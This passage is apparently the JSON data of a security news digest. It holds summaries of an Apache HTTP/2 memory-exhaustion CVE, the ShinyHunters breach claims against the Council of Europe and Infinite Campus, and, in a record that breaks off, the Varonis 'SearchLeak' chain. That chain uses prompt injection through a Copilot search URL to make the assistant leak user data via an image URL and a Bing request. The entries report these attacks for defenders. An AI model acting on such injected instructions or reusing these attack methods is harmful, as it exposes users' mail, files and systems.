003ccode\u003eh2\u003c/code\u003e on \u003ccode\u003eTCP/443\u003c/code\u003e, capping concurrent HTTP/2 streams, limiting request headers, monitoring for abnormal memory growth, and disabling HTTP/2 on exposed systems that cannot be patched promptly.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eCVE-2026-49975 is a memory exhaustion vulnerability in the \u003ccode\u003emod_http2\u003c/code\u003e module of Apache HTTP Server. The article states that it allows a remote attacker to cause a denial of service through maliciously crafted HTTP/2 requests. The flaw is classified as CWE-789, Memory Allocation with Excessive Size Value, and was publicly disclosed as part of an attack technique nicknamed the “HTTP/2 Bomb.”\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability has a CVSS v3.1 base score of 7.5, rated High by the National Vulnerability Database. The Apache Software Foundation rated the issue Moderate in its own advisory. The article explains that the scoring reflects an availability-only impact: there is no loss of confidentiality or integrity, but there can be a full loss of service.\u003c/p\u003e\n\n\u003ch2 id=\"attack-technique\"\u003eAttack technique\u003c/h2\u003e\n\n\u003cp\u003eThe article says exploitation is unauthenticated and requires only network access to a server with HTTP/2 enabled. The attack technique chains two legitimate HTTP/2 behaviors to create rapid memory growth on the server.\u003c/p\u003e\n\n\u003cp\u003eThe first behavior is an HPACK compression bomb. This forces the server to expand small compressed header inputs into much larger internal objects. The second behavior is an HTTP/2 flow-control hold, described as similar in spirit to a Slowloris attack, which keeps those allocations alive instead of allowing the server to reclaim them.\u003c/p\u003e\n\n\u003cp\u003eTogether, these behaviors can cause rapid memory growth and make a server unresponsive within seconds. The article also states that public reporting indicates the attack can be launched from a single modest connection rather than a large botnet. The vulnerability was reported by Quang Luong of Calif.IO, working with an AI-assisted code analysis process.\u003c/p\u003e\n\n\u003ch2 id=\"affected-assets-and-products\"\u003eAffected assets and products\u003c/h2\u003e\n\n\u003cp\u003eThe article states that CVE-2026-49975 affects Apache HTTP Server versions 2.4.17 through 2.4.67. Affected assets are typically internet-facing web servers or reverse proxies with HTTP/2 enabled. In many modern deployments, this means TLS-terminated HTTP/2 served on \u003ccode\u003eTCP/443\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe article notes that HTTP/2 is on by default in many current configurations. As a result, a server can be exposed without an administrator having explicitly opted in.\u003c/p\u003e\n\n\u003cp\u003eThe broader “HTTP/2 Bomb” disclosure described a class of issue affecting several major server stacks beyond Apache, including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003enginx\u003c/li\u003e\n\u003cli\u003eMicrosoft IIS\u003c/li\u003e\n\u003cli\u003eEnvoy\u003c/li\u003e\n\u003cli\u003eCloudflare Pingora\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eCVE-2026-49975 is the Apache-assigned identifier for the Apache-side instance of this class. The article says nginx addressed the underlying behavior in a separate release and Envoy published its own advisory under a different identifier. Because the same technique appears across multiple implementations, the article says practical exposure spans both Apache httpd and nginx fleets that front public web applications.\u003c/p\u003e\n\n\u003ch2 id=\"exposure-patterns-observed-by-cycognito\"\u003eExposure patterns observed by CyCognito\u003c/h2\u003e\n\n\u003cp\u003eCyCognito’s data shows exposure led by Communication Services, which accounted for 24.9% of observed assets. Information Technology contributed 18.0%, and Health Care accounted for 17.0%. The remaining 40.1% fell into an “Others” bucket.\u003c/p\u003e\n\n\u003cp\u003eThe article connects the Communication Services concentration to the way media, telecom, and content businesses operate. These organizations run large, distributed web footprints designed to serve traffic at scale, and the article says HTTP/2 is a protocol they adopt early to improve delivery performance. That performance-driven posture, distributed across edge nodes and partner integrations, widens the surface where default HTTP/2 configurations may be reachable from the internet.\u003c/p\u003e\n\n\u003cp\u003eAcross other sectors, the article says the exposure pattern reflects the general-purpose nature of the affected infrastructure. Apache httpd and nginx are used across industries and often sit in front of applications provisioned years earlier and rarely revisited once stable. The broad “Others” category is presented as evidence that exposure is not tied to a single vertical but to the widespread deployment of standard web servers and enabled-by-default protocol features.\u003c/p\u003e\n\n\u003ch2 id=\"fixes-and-patch-status\"\u003eFixes and patch status\u003c/h2\u003e\n\n\u003cp\u003eThe Apache Software Foundation released Apache HTTP Server 2.4.68 on June 8, 2026. The article states that this version fixes CVE-2026-49975 along with a batch of other vulnerabilities addressed in the same release. Upgrading to Apache HTTP Server 2.4.68 or later is described as the direct remediation for affected Apache deployments.\u003c/p\u003e\n\n\u003cp\u003eThe article warns that distribution-level patching is uneven and should be verified per platform. Red Hat issued an advisory with updated \u003ccode\u003ehttpd\u003c/code\u003e packages for Red Hat Enterprise Linux. Debian published a security update through its LTS channel.\u003c/p\u003e\n\n\u003cp\u003eFor nginx, the related behavior was addressed in a later release that introduced a header-count limit. However, the article says that fix was reported to cause a regression with external modules and was reverted in at least one downstream package pending further investigation. nginx did not assign a separate CVE for the issue.\u003c/p\u003e\n\n\u003cp\u003eBecause of the inconsistent state of downstream fixes, the article advises defenders to confirm patch availability and stability directly with their vendor or distribution. Where a stable patch is not yet available, the vulnerability should be treated as live and mitigated at the network layer.\u003c/p\u003e\n\n\u003ch2 id=\"recommended-defensive-actions\"\u003eRecommended defensive actions\u003c/h2\u003e\n\n\u003cp\u003eThe article recommends several actions while patching is being confirmed across platforms:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eInventory internet-facing Apache httpd and nginx servers with HTTP/2 enabled.\u003c/li\u003e\n\u003cli\u003eIdentify endpoints that advertise \u003ccode\u003eh2\u003c/code\u003e on \u003ccode\u003eTCP/443\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCap concurrent HTTP/2 streams per connection at the proxy or WAF.\u003c/li\u003e\n\u003cli\u003eConstrain request header count and size limits where the server supports it.\u003c/li\u003e\n\u003cli\u003eMonitor for connections that hold streams open alongside abnormal memory growth.\u003c/li\u003e\n\u003cli\u003eDisable HTTP/2 on exposed servers that cannot be patched promptly.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"cycognito-response\"\u003eCyCognito response\u003c/h2\u003e\n\n\u003cp\u003eCyCognito published an Emerging Threat Advisory for CVE-2026-49975 in the CyCognito platform. The article also says CyCognito is actively researching enhanced detection capabilities for this vulnerability. It closes by inviting readers to contact CyCognito to request a demo.\u003c/p\u003e\n","keyPoints":["CVE-2026-49975 is a memory exhaustion vulnerability in the mod_http2 module of Apache HTTP Server that allows unauthenticated remote attackers to cause denial of service with malicious HTTP/2 requests.","The flaw affects Apache HTTP Server versions 2.4.17 through 2.4.67, typically on internet-facing web servers or reverse proxies with HTTP/2 enabled.","The attack technique, called the HTTP/2 Bomb, combines an HPACK compression bomb with an HTTP/2 flow-control hold to cause rapid memory growth and keep allocations alive.","Apache HTTP Server 2.4.68, released on June 8, 2026, fixes CVE-2026-49975, but the article says defenders should verify distribution-level patch availability and stability per platform.","Recommended mitigations include inventorying internet-facing Apache httpd and nginx servers with HTTP/2 enabled, capping concurrent HTTP/2 streams, limiting request headers, monitoring for abnormal memory growth, and disabling HTTP/2 on exposed servers that cannot be patched promptly."],"insights":["The article highlights a scoring discrepancy: Apache rated CVE-2026-49975 as Moderate, while the National Vulnerability Database scores it High because the issue can cause full loss of service despite having no confidentiality or integrity impact.","The reported attack can be launched from a single modest connection rather than requiring a large botnet, which lowers the practical barrier for denial-of-service abuse.","Exposure may exist even where administrators did not explicitly enable the feature, because HTTP/2 is described as being on by default in many current configurations.","The article warns that downstream fixes are inconsistent, citing nginx-related patch instability and a reverted downstream package, so defenders should not assume vendor or distribution packages are already safely remediated.","The broad exposure pattern is driven less by a specific industry and more by the ubiquity of Apache httpd and nginx as long-lived general-purpose web infrastructure at the internet edge."],"referencedReports":[],"body":"\u003cp\u003eCVE-2026-49975 is a memory exhaustion vulnerability in the \u003ccode\u003emod_http2\u003c/code\u003e module of Apache HTTP Server that can allow a remote attacker to cause denial of service using malicious HTTP/2 requests. The issue is classified as CWE-789 and was publicly disclosed as part of an attack technique nicknamed the “HTTP/2 Bomb.” It has a CVSS v3.1 base score of 7.5, with an availability-only impact that can result in full loss of service.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability affects Apache HTTP Server versions 2.4.17 through 2.4.67, especially internet-facing web servers or reverse proxies with HTTP/2 enabled. The attack chains an HPACK compression bomb with an HTTP/2 flow-control hold to expand small compressed headers into larger internal objects and keep those memory allocations alive. Public reporting cited in the article says the attack can be launched from a single modest connection rather than a large botnet.\u003c/p\u003e\n\n\u003cp\u003eApache released version 2.4.68 on June 8, 2026, to fix CVE-2026-49975 along with other vulnerabilities. The article says distribution-level patching is uneven, with Red Hat and Debian issuing updates while related nginx handling has seen patch instability in at least one downstream package. Recommended actions include inventorying HTTP/2-enabled Apache httpd and nginx servers, limiting streams and headers, monitoring for held-open streams with memory growth, and disabling HTTP/2 where systems cannot be patched promptly.\u003c/p\u003e\n"},{"n":10,"title":"Council of Europe investigates ShinyHunters data breach claims","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/council-of-europe-investigates-shinyhunters-data-breach-claims/","time":"16:37","priority":"SHOULD READ","score":86,"tldr":"The Council of Europe is investigating ShinyHunters’ claim that it stole over 429,000 HR and payroll documents containing sensitive personal and financial data. The extortion group threatened to leak the files if the organization did not respond by June 16, 2026.","briefOverview":"\u003cp\u003eThe Council of Europe is investigating claims by the ShinyHunters extortion group that it stole data from the organization. The Council told BleepingComputer that it is assessing the situation and had no further comment. The organization is described as Europe’s oldest intergovernmental body and a leading human rights organization representing 46 European member states and over 700 million people.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters claimed on its dark web leak site that it stole more than 429,000 documents containing HR and payroll data from multiple Council of Europe departments. The group threatened to leak the allegedly exfiltrated files on Tuesday if the Council did not reach out by June 16, 2026. The claimed data includes payslips, personnel files, CVs, and other files.\u003c/p\u003e\n\n\u003cp\u003eThe allegedly stolen files are said to contain names, dates of birth, home addresses, phone numbers, employee IDs, salaries, bank account details, tax and Social Security information, medical records, and more. The article also notes that ShinyHunters has recently claimed other campaigns involving Salesforce customers, Snowflake customers, third-party integration providers, and Oracle PeopleSoft servers. The Council of Europe has not confirmed the breach in the article beyond saying it is investigating the matter.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eThe Council of Europe is probing claims of a data breach made by the ShinyHunters extortion group. The Council of Europe is described as the continent’s oldest intergovernmental body and Europe’s leading human rights organization. It represents 46 European member states and a population of more than 700 million people, promoting democracy and the rule of law across Europe and beyond.\u003c/p\u003e\n\n\u003cp\u003eWhen BleepingComputer asked the Council to confirm ShinyHunters’ claims, the organization’s media department said it was investigating and assessing the situation. The Council said it had no further comment at this stage. The article does not report any confirmation from the Council that the claimed breach occurred or that the listed data was stolen.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters posted the claim on its dark web leak site over the weekend. The group alleged that it stole more than 429,000 documents containing HR and payroll data from multiple Council of Europe departments. It threatened to leak the allegedly exfiltrated files on Tuesday if the Council did not reach out by June 16, 2026.\u003c/p\u003e\n\n\u003cp\u003eAccording to ShinyHunters, the allegedly stolen documents include more than 409,000 payslips for over 10,000 staff, covering the years 2011 to 2026. The group also claimed to have over 3,700 in-house personnel files, more than 14,000 CVs, and other files. The claimed dataset is said to include personal and financial information such as names, dates of birth, home addresses, phone numbers, employee IDs, salaries, bank account details, tax and Social Security information, and medical records.\u003c/p\u003e\n\n\u003cp\u003eThe article places the claim in the context of ShinyHunters’ recent activity. Over the past year, the group has claimed attacks targeting Salesforce customers and said it stole more than 1.5 billion records in incidents affecting hundreds of companies and organizations worldwide in Salesforce Aura and Salesloft Drift campaigns. The group was also linked to attacks against more than a dozen Snowflake customers and other third-party integration providers.\u003c/p\u003e\n\n\u003cp\u003eMore recently, the article says ShinyHunters claimed responsibility for a data theft campaign affecting over 100 organizations, including the University of Nottingham. That campaign followed exploitation of a zero-day vulnerability in Oracle’s PeopleSoft enterprise business software suite. The Council of Europe matter remains under investigation according to the organization’s statement in the article.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eThe article reports that the Council of Europe is investigating claims of a data breach made by the ShinyHunters extortion group. The Council of Europe told BleepingComputer that it is currently investigating the matter and assessing the situation. It said it had no further comment at this stage.\u003c/p\u003e\n\n\u003cp\u003eThe Council of Europe is described as Europe’s oldest intergovernmental body and the continent’s leading human rights organization. It represents 46 European member states and a population of more than 700 million people. Its work is described as promoting democracy and the rule of law across Europe and beyond.\u003c/p\u003e\n\n\u003ch2 id=\"claimed-breach-details\"\u003eClaimed breach details\u003c/h2\u003e\n\n\u003cp\u003eShinyHunters posted its claim on a dark web leak site over the weekend. The group alleged that it stole more than 429,000 documents containing HR and payroll data from multiple Council of Europe departments.\u003c/p\u003e\n\n\u003cp\u003eThe group threatened to leak the allegedly exfiltrated files on Tuesday. It stated that the Council had until June 16, 2026, to reach out before the files would be leaked along with what it described as additional digital problems.\u003c/p\u003e\n\n\u003ch2 id=\"allegedly-affected-data\"\u003eAllegedly affected data\u003c/h2\u003e\n\n\u003cp\u003eAccording to the ShinyHunters post cited in the article, the allegedly stolen documents include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eMore than 409,000 payslips for over 10,000 staff, spanning 2011 to 2026.\u003c/li\u003e\n\u003cli\u003eMore than 3,700 in-house personnel files.\u003c/li\u003e\n\u003cli\u003eMore than 14,000 CVs.\u003c/li\u003e\n\u003cli\u003eOther files not further specified in the article.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe files are said to contain a broad range of personal and financial information, including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eNames.\u003c/li\u003e\n\u003cli\u003eDates of birth.\u003c/li\u003e\n\u003cli\u003eHome addresses.\u003c/li\u003e\n\u003cli\u003ePhone numbers.\u003c/li\u003e\n\u003cli\u003eEmployee IDs.\u003c/li\u003e\n\u003cli\u003eSalaries.\u003c/li\u003e\n\u003cli\u003eBank account details.\u003c/li\u003e\n\u003cli\u003eTax information.\u003c/li\u003e\n\u003cli\u003eSocial Security information.\u003c/li\u003e\n\u003cli\u003eMedical records.\u003c/li\u003e\n\u003cli\u003eOther unspecified information.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"council-of-europe-response\"\u003eCouncil of Europe response\u003c/h2\u003e\n\n\u003cp\u003eThe Council of Europe did not confirm the breach in the article. When asked by BleepingComputer to confirm the cybercrime gang’s claims, the Council’s media department said only that the organization is investigating and assessing the situation.\u003c/p\u003e\n\n\u003cp\u003eThe Council’s quoted statement was: “We are currently investigating the matter and assessing the situation. We have no further comment to make at this stage.” The article therefore presents the breach as an allegation by ShinyHunters that remains under investigation by the Council.\u003c/p\u003e\n\n\u003ch2 id=\"threat-actor-context\"\u003eThreat actor context\u003c/h2\u003e\n\n\u003cp\u003eThe article identifies ShinyHunters as an extortion group. It says the group has claimed several other data theft campaigns over the past year.\u003c/p\u003e\n\n\u003cp\u003eThe article says ShinyHunters has claimed attacks targeting Salesforce customers. The group claimed it stole more than 1.5 billion records in breaches affecting hundreds of companies and organizations worldwide in Salesforce Aura and Salesloft Drift campaigns.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters was also linked to high-profile attacks against more than a dozen Snowflake customers and other third-party integration providers. The article does not provide further details on those incidents beyond referencing them as part of ShinyHunters’ recent activity.\u003c/p\u003e\n\n\u003ch2 id=\"recent-related-claims\"\u003eRecent related claims\u003c/h2\u003e\n\n\u003cp\u003eThe article also says that, last week, ShinyHunters claimed responsibility for a new data theft campaign that led to breaches at over 100 organizations. One named affected organization in that campaign was the University of Nottingham.\u003c/p\u003e\n\n\u003cp\u003eThat campaign followed exploitation of a zero-day vulnerability in Oracle’s PeopleSoft enterprise business software suite. The article states that Oracle mitigated the PeopleSoft zero-day exploited in those data theft attacks.\u003c/p\u003e\n\n\u003ch2 id=\"current-status\"\u003eCurrent status\u003c/h2\u003e\n\n\u003cp\u003eThe key current development is that the Council of Europe is investigating ShinyHunters’ claims. The article does not state that the Council has validated the claimed data theft, confirmed the number of affected documents, or verified the types of information allegedly stolen.\u003c/p\u003e\n\n\u003cp\u003eThe main potential impact described in the article is the possible exposure of extensive HR and payroll records, including personnel, payroll, CV, financial, tax, Social Security, and medical information. The alleged leak deadline cited by ShinyHunters was June 16, 2026.\u003c/p\u003e\n","keyPoints":["The Council of Europe said it is investigating ShinyHunters’ claims of a data breach and assessing the situation.","ShinyHunters claimed it stole more than 429,000 documents containing HR and payroll data from multiple Council of Europe departments.","The group threatened to leak the allegedly stolen files on Tuesday if the Council of Europe did not reach out by June 16, 2026.","ShinyHunters said the allegedly stolen documents include more than 409,000 payslips for over 10,000 staff, over 3,700 in-house personnel files, more than 14,000 CVs, and other files.","The allegedly stolen files are said to contain personal and financial information including names, dates of birth, home addresses, phone numbers, employee IDs, salaries, bank account details, tax and Social Security information, and medical records."],"insights":["The allegedly stolen payslips span from 2011 to 2026, indicating that the claimed exposure involves long-retained historical employee payroll records rather than only current data.","The claimed dataset combines HR, payroll, CV, banking, tax, Social Security, and medical information, making it unusually comprehensive for identity fraud and employee-targeted extortion risks if the claims are accurate.","ShinyHunters’ recent claims involve multiple enterprise and SaaS ecosystems, including Salesforce, Snowflake, Salesloft Drift, and Oracle PeopleSoft, showing that the group is repeatedly associating its campaigns with widely used business platforms and integrations.","The Council of Europe’s public response remains limited to confirming an investigation, so the article provides no confirmation that ShinyHunters’ claims or the listed data types have been validated."],"referencedReports":[],"body":"\u003cp\u003eThe Council of Europe is investigating claims by the ShinyHunters extortion group that it stole data from the organization. The Council told BleepingComputer that it is assessing the situation and had no further comment. The organization is described as Europe’s oldest intergovernmental body and a leading human rights organization representing 46 European member states and over 700 million people.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters claimed on its dark web leak site that it stole more than 429,000 documents containing HR and payroll data from multiple Council of Europe departments. The group threatened to leak the allegedly exfiltrated files on Tuesday if the Council did not reach out by June 16, 2026. The claimed data includes payslips, personnel files, CVs, and other files.\u003c/p\u003e\n\n\u003cp\u003eThe allegedly stolen files are said to contain names, dates of birth, home addresses, phone numbers, employee IDs, salaries, bank account details, tax and Social Security information, medical records, and more. The article also notes that ShinyHunters has recently claimed other campaigns involving Salesforce customers, Snowflake customers, third-party integration providers, and Oracle PeopleSoft servers. The Council of Europe has not confirmed the breach in the article beyond saying it is investigating the matter.\u003c/p\u003e\n"},{"n":17,"title":"Infinite Campus data breach affects 137,000 school staff accounts","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/infinite-campus-data-breach-affects-137-000-school-staff-accounts/","time":"12:38","priority":"SHOULD READ","score":86,"tldr":"ShinyHunters stole Salesforce data from Infinite Campus, exposing personal and contact information tied to about 137,000 school staff accounts. Infinite Campus says the compromised data was mostly staff directory information and that customer databases were not affected.","briefOverview":"\u003cp\u003eThe ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a Salesforce data theft attack targeting Infinite Campus in March. Infinite Campus provides a K-12 student information system to over 3,200 school districts in the United States and manages data for 11 million students in 46 states. The company said the attacker targeted its Salesforce instance rather than customer databases.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus told customers that the exposed information consisted largely of names and contact details for school staff, much of it directory information commonly found on school websites. Have I Been Pwned later analyzed the leaked data and said it included 137,100 accounts with names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets. ShinyHunters claimed responsibility on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with PII and internal corporate data.\u003c/p\u003e\n\n\u003cp\u003eThe article compares the incident to the December 2024 PowerSchool hack, though the PowerSchool breach affected far more people, including 62 million students. It also places the incident within ShinyHunters’ broader activity against Salesforce customers and other enterprise software targets. The group has claimed large-scale data theft from Salesforce-related campaigns and more recently from attacks exploiting an Oracle PeopleSoft zero-day.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eShinyHunters stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack involving Infinite Campus. Infinite Campus is an education technology company whose K-12 student information system is used by over 3,200 school districts across the United States. The company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003cp\u003eWhen Infinite Campus notified customers in March, it did not name a specific hacking group. It described the attacker as part of a group known for targeting the Salesforce accounts of hundreds of companies. Infinite Campus said the target was its Salesforce instance and that it had no evidence customer databases were compromised.\u003c/p\u003e\n\n\u003cp\u003eThe company said the exposed data contained names and contact information for school staff and other publicly available information. It stated that the majority of the data was directory information commonly found on school websites. However, Have I Been Pwned later said its analysis of the leaked data found 137,100 accounts containing names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters claimed responsibility for the breach on its data leak site. The group leaked a 1.2GB archive of documents allegedly containing Salesforce records with personally identifiable information and other internal corporate data. The article identifies the incident as similar to the December 2024 PowerSchool hack, while noting that the PowerSchool breach had a much larger impact.\u003c/p\u003e\n\n\u003cp\u003eThe article also connects the Infinite Campus incident to broader ShinyHunters activity over the past year. ShinyHunters has targeted many Salesforce customers and claimed to have stolen more than 1.5 billion records after breaching hundreds of companies in the Salesloft Drift hack and Salesforce Aura campaign. More recently, the group claimed responsibility for data theft attacks exploiting a zero-day vulnerability in Oracle PeopleSoft against more than 100 organizations, including the University of Nottingham.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eThe article reports that the ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a Salesforce data theft attack involving Infinite Campus. The attack took place in March and targeted the widely used Infinite Campus K-12 student information system’s Salesforce environment.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus is an education technology company that provides a student information system to more than 3,200 school districts across the United States. According to the article, the company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003ch2 id=\"targeted-environment\"\u003eTargeted Environment\u003c/h2\u003e\n\n\u003cp\u003eInfinite Campus said the attacker targeted its Salesforce instance. The company told affected customers that it had no evidence customer databases were compromised.\u003c/p\u003e\n\n\u003cp\u003eThe exposed data was described by Infinite Campus as consisting of names and contact information for school staff. The company also said the majority of the exposed information was directory information commonly found on school websites.\u003c/p\u003e\n\n\u003ch2 id=\"attribution-and-disclosure\"\u003eAttribution and Disclosure\u003c/h2\u003e\n\n\u003cp\u003eWhen Infinite Campus notified customers of the breach in March, it did not attribute the incident to a specific hacking group. Instead, it described the attacker as “part of a group known for targeting the Salesforce accounts of hundreds of companies.”\u003c/p\u003e\n\n\u003cp\u003eShinyHunters later claimed responsibility for the breach on its data leak site. The group also leaked a 1.2GB archive of documents that allegedly contained Salesforce records with personally identifiable information and other internal corporate data.\u003c/p\u003e\n\n\u003ch2 id=\"data-exposure\"\u003eData Exposure\u003c/h2\u003e\n\n\u003cp\u003eHave I Been Pwned analyzed the leaked data and said the breach exposed data from 137,100 accounts. The exposed data included:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUnique names\u003c/li\u003e\n\u003cli\u003eEmail addresses\u003c/li\u003e\n\u003cli\u003eEmployers\u003c/li\u003e\n\u003cli\u003eJob titles\u003c/li\u003e\n\u003cli\u003ePhone numbers\u003c/li\u003e\n\u003cli\u003ePhysical addresses\u003c/li\u003e\n\u003cli\u003eUsernames\u003c/li\u003e\n\u003cli\u003eSupport tickets\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eHave I Been Pwned said the group published data allegedly taken from Infinite Campus that contained 137,000 unique email addresses, along with names, phone numbers, physical addresses, and support tickets.\u003c/p\u003e\n\n\u003ch2 id=\"affected-parties\"\u003eAffected Parties\u003c/h2\u003e\n\n\u003cp\u003eThe affected accounts were school staff accounts. Infinite Campus characterized much of the exposed information as staff contact data and directory information commonly found on school websites.\u003c/p\u003e\n\n\u003cp\u003eThe article does not state that student databases were compromised. Infinite Campus specifically said it had no evidence that customer databases were affected.\u003c/p\u003e\n\n\u003ch2 id=\"comparison-to-powerschool\"\u003eComparison to PowerSchool\u003c/h2\u003e\n\n\u003cp\u003eThe article compares the Infinite Campus incident to the December 2024 PowerSchool hack. It states that the incidents are very similar, but that their impact is vastly different.\u003c/p\u003e\n\n\u003cp\u003eThe PowerSchool breach affected 62 million students. The hacker behind that attack, a 19-year-old college student from Massachusetts, was sentenced to four years in prison after pleading guilty in May 2025.\u003c/p\u003e\n\n\u003ch2 id=\"broader-shinyhunters-activity\"\u003eBroader ShinyHunters Activity\u003c/h2\u003e\n\n\u003cp\u003eThe article places the Infinite Campus breach within a broader pattern of ShinyHunters activity against Salesforce customers. It states that ShinyHunters has targeted many Salesforce customers over the past year.\u003c/p\u003e\n\n\u003cp\u003eThe group has claimed to have stolen more than 1.5 billion records after breaching hundreds of companies in the Salesloft Drift hack and the Salesforce Aura campaign.\u003c/p\u003e\n\n\u003cp\u003eMore recently, ShinyHunters claimed responsibility for a new data theft campaign exploiting a zero-day vulnerability in Oracle’s PeopleSoft enterprise business software suite. According to the article, that campaign was used to steal data from more than 100 organizations, including the University of Nottingham.\u003c/p\u003e\n\n\u003ch2 id=\"key-impact\"\u003eKey Impact\u003c/h2\u003e\n\n\u003cp\u003eThe central impact of the Infinite Campus incident is the exposure of personal and contact information tied to 137,100 school staff accounts. While Infinite Campus said much of the data was directory-style information and that customer databases were not compromised, the leaked dataset analyzed by Have I Been Pwned also included support tickets, usernames, physical addresses, employers, and job titles.\u003c/p\u003e\n","keyPoints":["ShinyHunters stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus.","Infinite Campus said the attacker targeted its Salesforce instance and that the exposed data consisted largely of names and contact information for school staff, much of it directory information commonly found on school websites.","Have I Been Pwned analyzed the leaked data and said it exposed 137,100 accounts with unique names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.","ShinyHunters claimed responsibility for the breach on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with personally identifiable information and internal corporate data.","Infinite Campus said it had no evidence that customer databases were compromised."],"insights":["The incident shows that third-party SaaS platforms such as Salesforce can expose education-sector data even when the core student information system databases are not compromised.","Although Infinite Campus characterized most exposed information as school directory data, Have I Been Pwned found the leak also included support tickets, usernames, physical addresses, employers, and job titles.","The breach is far smaller than the December 2024 PowerSchool hack, which affected 62 million students, but it still adds to a broader ShinyHunters campaign against Salesforce customers.","ShinyHunters’ activity has expanded beyond Salesforce-related campaigns to claimed data theft attacks exploiting an Oracle PeopleSoft zero-day against more than 100 organizations."],"referencedReports":[{"title":"Infinite Campus","url":"https://haveibeenpwned.com/Breach/InfiniteCampus","publisher":"Have I Been Pwned","context":"The article cites Have I Been Pwned's analysis of the leaked Infinite Campus data, which found 137,100 exposed accounts and listed the data types involved.","category":"","primary":false}],"body":"\u003cp\u003eThe ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a Salesforce data theft attack targeting Infinite Campus in March. Infinite Campus provides a K-12 student information system to over 3,200 school districts in the United States and manages data for 11 million students in 46 states. The company said the attacker targeted its Salesforce instance rather than customer databases.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus told customers that the exposed information consisted largely of names and contact details for school staff, much of it directory information commonly found on school websites. Have I Been Pwned later analyzed the leaked data and said it included 137,100 accounts with names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets. ShinyHunters claimed responsibility on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with PII and internal corporate data.\u003c/p\u003e\n\n\u003cp\u003eThe article compares the incident to the December 2024 PowerSchool hack, though the PowerSchool breach affected far more people, including 62 million students. It also places the incident within ShinyHunters’ broader activity against Salesforce customers and other enterprise software targets. The group has claimed large-scale data theft from Salesforce-related campaigns and more recently from attacks exploiting an Oracle PeopleSoft zero-day.\u003c/p\u003e\n"},{"n":22,"title":"SearchLeak: How We Turned M365 Copilot Into a One-Click Data Exfiltration Weapon","source":"varonis.com","sourceColorIdx":9,"link":"https://www.varonis.com/blog/searchleak","time":"13:01","priority":"SHOULD READ","score":86,"tldr":"Varonis researchers found a critical Microsoft 365 Copilot Enterprise Search flaw chain, dubbed SearchLeak, that let attackers exfiltrate a user’s emails, files, calendar data, and other accessible organizational content with a single crafted Microsoft link click. Microsoft has patched the issue under CVE-2026-42824.","briefOverview":"\u003cp\u003eVaronis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The chain could turn Copilot Enterprise Search into a silent data exfiltration mechanism after a victim clicked a crafted link to a trusted Microsoft domain. Microsoft remediated the issue under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eThe attack combined Parameter-to-Prompt Injection, an HTML rendering race condition, and a CSP bypass via Bing server-side request forgery. A crafted q parameter in a Copilot Search URL could be interpreted as instructions, causing Copilot to search content the user could access and place extracted data into an image URL. During streamed output, raw HTML could briefly render before sanitization, allowing the browser to make a request to Bing, which then fetched an attacker-controlled URL.\u003c/p\u003e\n\n\u003cp\u003eThe article says the impact could include exposure of emails, security codes, calendar details, SharePoint documents, OneDrive files, and other indexed business content accessible to the victim. The attack required no plugins, special attacker permissions, or second click. Varonis recommends monitoring suspicious Copilot Search URLs, reviewing CSP allowlists, and treating AI streaming output as untrusted.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eVaronis Threat Labs reported SearchLeak, a vulnerability chain that affected Microsoft 365 Copilot Enterprise Search. The article describes it as a way to turn Copilot Enterprise Search into a one-click data exfiltration mechanism. Microsoft remediated the vulnerability under CVE-2026-42824 and gave it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eSearchLeak is built from three linked weaknesses. The first is Parameter-to-Prompt Injection, where the q parameter in a Copilot Enterprise Search URL is passed to Copilot as executable instructions 